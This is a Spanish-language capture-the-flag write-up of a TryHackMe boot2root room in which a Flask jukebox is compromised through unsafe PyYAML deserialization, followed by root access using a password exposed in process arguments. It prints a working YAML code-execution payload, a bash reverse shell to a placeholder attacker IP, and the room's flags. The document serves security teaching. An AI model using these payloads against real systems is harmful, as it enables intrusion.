---
title: "Beach Bar"
date: 2026-07-31 09:34:00 -0400
description: "Explotación de deserialización YAML insegura en una jukebox web para obtener RCE, seguida de escalada de privilegios mediante credenciales expuestas en argumentos de un proceso root."
categories: [TryHackMe, Hacker Holidays 2026]
tags: [YAML Deserialization, Credential Reuse, Boot2Root, Easy, Python, Flask]
---

> 📌 **Ficha Técnica**
> - **Plataforma:** TryHackMe
> - **Evento/Sala:** Hacker Holidays - Beach Bar
> - **Dificultad:** Fácil
> - **Categoría:** Boot2Root
> - **Técnicas Clave:** YAML Deserialization (PyYAML unsafe load), Credential Exposure via Process Arguments, Reverse Shell, Privilege Escalation

---

## Introducción

**Beach Bar** es una máquina **Boot2Root** de dificultad **Fácil** perteneciente al evento **Hacker Holidays** de TryHackMe. La sala nos sitúa en un ambiente veraniego donde una jukebox web acepta "algo más que títulos de canciones", y un servicio en ejecución "anuncia silenciosamente" información sensible. La cadena de explotación combina una vulnerabilidad de deserialización insegura con una mala práctica de almacenamiento de credenciales en argumentos de proceso.

---

## Reconocimiento

### Escaneo de Puertos

Iniciamos con un escaneo de puertos para identificar los servicios expuestos:

```bash
nmap -sC -sV -p- --min-rate 1000 <IP_MAQUINA>
```

Los resultados revelan únicamente dos puertos abiertos:

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 22/tcp | SSH | OpenSSH 9.6p1 Ubuntu (solo autenticación por clave pública) |
| 80/tcp | HTTP | Gunicorn (Python/Flask) |

> El puerto 22 solo acepta autenticación por clave pública, por lo que el vector de entrada principal es la aplicación web.
{: .prompt-info }

### Análisis de la Aplicación Web

Al acceder a `http://<IP_MAQUINA>` somos redirigidos a `/login`, una página de autenticación con estilo veraniego. Inspeccionando el **código fuente** de la página, encontramos un comentario HTML que no debería estar ahí:

```html
<!--
    staff note: the demo DJ login is still enabled for the soft opening.
    dj / dj  -- swap this before the season starts (ticket BAR-7)
-->
```

> ¡Nunca dejar credenciales hardcodeadas en comentarios del frontend! Este es un error clásico de despliegue apresurado.
{: .prompt-warning }

---

## Explotación: La Jukebox que Acepta Más que Canciones

### Acceso al Panel del DJ

Con las credenciales filtradas, iniciamos sesión en el panel del DJ:

- **Usuario:** `dj`
- **Contraseña:** `dj`

El panel expone las siguientes funcionalidades:
- `/dashboard` — Panel principal de la jukebox
- `/import` — Importar playlist desde archivo YAML
- `/export` — Exportar playlist a archivo YAML
- `/logout`

### Análisis de la Funcionalidad de Importación

Exportando una playlist legítima, obtenemos un archivo con la siguiente estructura:

```yaml
# Beach Bar jukebox playlist export
playlist:
  name: Sunset Session
  vibe: golden hour
  tracks:
    - artist: Khruangbin
      title: Maria Tambien
    - artist: Men I Trust
      title: Show Me How
```

Al importar una playlist, el servidor parsea el YAML y refleja el contenido como una representación de diccionario Python. Esto indica que el backend utiliza **PyYAML** para deserializar el contenido.

### Identificación de la Vulnerabilidad

El código fuente de la aplicación revela el uso de `yaml.load()` con un loader inseguro:

```python
parsed = yaml.load(content, Loader=yaml.Loader)  # ← VULNERABLE
```

> `yaml.load()` con `Loader=yaml.Loader` permite la construcción de objetos Python arbitrarios mediante tags especiales como `!!python/object/apply`. La alternativa segura es utilizar `yaml.safe_load()`.
{: .prompt-warning }

### Prueba de Concepto (PoC)

Subimos una playlist maliciosa para ejecutar el comando `id` y confirmar la ejecución remota de código (RCE):

```yaml
playlist:
  name: !!python/object/apply:subprocess.check_output [["id"]]
  tracks:
    - artist: x
      title: x
```

La respuesta del servidor incluye:

```python
{'playlist': {'name': b'uid=1001(bartender) gid=1001(bartender) groups=1001(bartender)
', ...}}
```

✅ **Confirmado:** Ejecución arbitraria de comandos como el usuario `bartender`.

### Obtención de Shell Reverso

En nuestra máquina atacante, ponemos un listener en escucha:

```bash
nc -lvnp 4444
```

Subimos la siguiente playlist con un payload de reverse shell:

```yaml
playlist:
  name: !!python/object/apply:os.system ["bash -c 'bash -i >& /dev/tcp/<TU_IP>/4444 0>&1'"]
```

Recibimos la shell y la mejoramos para obtener una TTY completa:

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```

### User Flag

Una vez dentro como `bartender`, leemos la primera flag:

```bash
cat /home/bartender/user.txt
```

**Flag de usuario:**
```
THM{y4ml_pl4yl1st_pwns_th3_b34ch}
```

---

## Escalada de Privilegios: El Servicio del Paseo Marítimo

### Hallazgo del Proceso Sospechoso

La descripción del room mencionaba *"un servicio down the boardwalk quietly announcing 'something'"*. Esto apunta directamente a un proceso en ejecución que expone información sensible.

Inspeccionamos los procesos en ejecución:

```bash
ps auxww
```

Identificamos un proceso ejecutándose como **root**:

```bash
root  609  ... /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k
```

### Extracción de la Contraseña

El argumento `--stream-pass` contiene la contraseña en **texto plano**:

> **`SunsetSpritz2024!`**

> Los argumentos de línea de comandos en Linux son visibles para todos los usuarios locales a través de `ps`, `/proc/<PID>/cmdline`, etc. Los secrets nunca deben pasarse como argumentos de proceso; se deben utilizar variables de entorno, archivos de configuración protegidos o gestores de secretos.
{: .prompt-warning }

### Escalada a root

Validamos la contraseña obtenida. SSH no funciona (solo clave pública), pero `su` sí:

```bash
su root
# Password: SunsetSpritz2024!
whoami
# root
```

### Root Flag

Con privilegios de root, leemos la flag final:

```bash
cat /root/root.txt
```

**Flag de root:**
```
THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}
```

---

## Conclusión / Retroalimentación

**Beach Bar** es una sala excelente para principiantes en Boot2Root que buscan practicar cadenas de explotación realistas. El room combina de manera efectiva dos vectores clásicos:

1. **Deserialización insegura de YAML:** Un error común en aplicaciones Python que confían en `yaml.load()` sin el `SafeLoader`. Es un recordatorio importante de que no todos los parsers son seguros por defecto.

2. **Exposición de credenciales en argumentos de proceso:** Una mala práctica de hardening que permite a cualquier usuario local elevar privilegios simplemente inspeccionando procesos. La reutilización de la contraseña del streamer como contraseña de root cierra la cadena de forma elegante.

### Aprendizajes Clave

- **Nunca usar `yaml.load()` sin `SafeLoader`** en código de producción. Preferir siempre `yaml.safe_load()`.
- **No hardcodear credenciales** en comentarios HTML, archivos de configuración accesibles o argumentos de proceso.
- **No reutilizar contraseñas** entre diferentes servicios o niveles de privilegio.
- **Auditar procesos en ejecución** (`ps auxww`) es una técnica de enumeración fundamental post-explotación.

La sala tiene un ambiente temático muy disfrutable y una dificultad adecuada para consolidar conceptos de explotación web y escalada local. Totalmente recomendada para quienes están comenzando en CTFs de tipo Boot2Root.

---

> ¡Gracias por leer! Si encontraste útil este writeup, no dudes en compartirlo o dejar un comentario. 🏖️
{: .prompt-tip }
